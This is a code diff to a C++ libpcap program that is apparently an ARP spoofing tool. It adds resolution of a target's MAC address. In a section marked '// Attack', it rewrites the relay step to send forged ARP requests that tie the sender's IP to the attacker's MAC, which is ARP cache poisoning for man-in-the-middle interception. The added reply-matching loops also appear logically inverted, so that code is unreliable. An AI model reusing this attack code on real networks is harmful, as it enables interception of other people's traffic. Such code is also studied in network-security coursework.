@@ -112,6 +112,7 @@ int main(int argc, char* argv[]) {
 	Mac broadcastTmac = Mac("00:00:00:00:00:00");
 
 	Mac senderMac;
+	Mac targetMac;
 	Mac myMac;
 	Ip myIp;
 
@@ -144,13 +145,34 @@ int main(int argc, char* argv[]) {
 			res = pcap_next_ex(handle, &header, &rpacket);
 			arpreply = *(EthArpPacket*)rpacket;
 
-			while (arpreply.eth_.type() != 0x0806) {
+			while (arpreply.eth_.type() != 0x0806 && arpreply.arp_.sip_ == senderIp) {
 				res = pcap_next_ex(handle, &header, &rpacket);
 				arpreply = *(EthArpPacket*)rpacket;
 			}
 
 			senderMac = arpreply.eth_.smac_;
 			IpMacMap[senderIp] = senderMac;
+		}
+
+		// Get Target Mac
+		if (IpMacMap.find(targetIp) != IpMacMap.end())
+			targetMac = IpMacMap[targetIp];
+		else {
+			res = sendArp(handle, broadcastDmac, myMac, ArpHdr::Request, myMac, myIp, broadcastTmac, targetIp);
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
+
+			res = pcap_next_ex(handle, &header, &rpacket);
+			arpreply = *(EthArpPacket*)rpacket;
+
+			while (arpreply.eth_.type() != 0x0806 && arpreply.arp_.sip_ == targetIp) {
+				res = pcap_next_ex(handle, &header, &rpacket);
+				arpreply = *(EthArpPacket*)rpacket;
+			}
+
+			targetMac = arpreply.eth_.smac_;
+			IpMacMap[targetIp] = targetMac;
 		}
 
 		// Attack
@@ -165,7 +187,7 @@ int main(int argc, char* argv[]) {
 		relayPacket = *(EthArpPacket*)rpacket;
 
 		if (relayPacket.arp_.sip_ == senderIp) {
-			res = sendArp(handle, relayPacket.eth_.dmac_, relayPacket.eth_.smac_, ArpHdr::Request, relayPacket.arp_.smac_, relayPacket.arp_.sip_, relayPacket.arp_.tmac_, relayPacket.arp_.tip_);
+			res = sendArp(handle, targetMac, myMac, ArpHdr::Request, myMac, relayPacket.arp_.sip_, targetMac, relayPacket.arp_.tip_);
 			if (res != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 			}
